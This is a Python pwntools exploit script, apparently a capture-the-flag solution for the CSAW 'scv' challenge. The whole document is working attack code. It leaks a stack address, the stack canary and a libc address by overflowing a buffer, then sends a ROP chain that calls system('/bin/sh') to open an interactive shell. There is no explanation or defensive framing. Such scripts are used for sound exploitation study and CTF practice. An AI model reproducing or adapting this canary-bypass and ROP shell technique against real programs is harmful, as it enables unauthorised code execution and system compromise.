#! /usr/bin/python
from pwn import *
import time
def feed_scv(p,food):
    p.sendline('1')
    p.send(food)

def review_the_food(p):
    p.sendlineafter('>>','2')
    p.recvuntil('WELL.....\n-------------------------')
    x = p.recvuntil('-------------------------')
    return x.strip('-------------------------').strip('\n')

def mine_minerals(p):
    p.sendline('3')

def address_hex(x):
    lst = list(x)
    address = 0x00
    for i in range(len(lst)):
        val = lst[i]
        if val != '\x00':
            mult = int(pow(256,i))
            address += int(val.encode('hex'),16) * mult
    return address


def main():
    pop_rdi_gad = 0x400ea3
    p = process('./scv')
    #p = remote('pwn.chal.csaw.io', 3764)
    review_the_food(p)

    print 'moo'
    feed_scv(p,'c'* (0x38))
    p.recv()
    stack = review_the_food(p).strip('c')
    stack_addr = address_hex(stack) - 0x60
    print hex(stack_addr)
    p.recv()
    feed_scv(p, 'b' * (169  ) )
    canary = review_the_food(p).strip('b')
    print canary , len(canary)
    canary = '\x00' + canary
    p.recv()
    feed_scv(p,'b'*184)
    libc_adr = review_the_food(p).strip('b')
    system_func = address_hex(libc_adr) +0x24b60 
    print  hex(system_func)
    feed_scv(p,
    '/bin/sh\x00'+
    'b'*(160)+
    canary[0:9]+
    'aaaaaaa' +
    p64(pop_rdi_gad) +
    p64(stack_addr) +
    p64(system_func)+p64(2336))
    mine_minerals(p) 
    p.interactive() 


if __name__ == "__main__":
    main()
